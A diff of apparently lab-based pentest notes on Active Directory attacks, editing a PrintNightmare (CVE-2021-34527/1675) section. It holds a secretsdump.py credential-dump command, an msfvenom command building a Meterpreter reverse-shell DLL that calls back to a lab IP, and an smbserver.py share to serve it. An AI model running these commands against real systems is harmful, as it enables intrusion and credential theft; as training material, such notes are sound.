@@ -50,7 +50,7 @@ $ secretsdump.py -just-dc-user wley -k -no-pass -dc-ip 'ACADEMY-EA-DC01.INLANEFR
 This vulnerability encompasses two CVEs [2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems and allows remote execution of arbitrary code with SYSTEM rights using a domain account.
 
 `PrintNightmare` is an RCE (Remote Command Execution) vulnerability. 
-If the vulnerable machine is configured to reject remote connection, this vulnerability could still be exploited in an LPE (Local Privilege Escalation).
+If the vulnerable machine is configured to reject remote connection, this vulnerability could still be exploited in a LPE (Local Privilege Escalation).
 
 The vulnerability lies in the functions allowing remote driver installation by users, `RpcAddPrinterDriverEx` and `RpcAddPrinterDriver`.
 
@@ -86,7 +86,7 @@ Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
 Protocol: [MS-RPRN]: Print System Remote Protocol 
 
 # Generate a DLL pyaload
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll -o backupscript.dll
 
 # Create a Share with smbserver.py
 $ sudo smbserver.py -smb2support shareName /path/to/dll
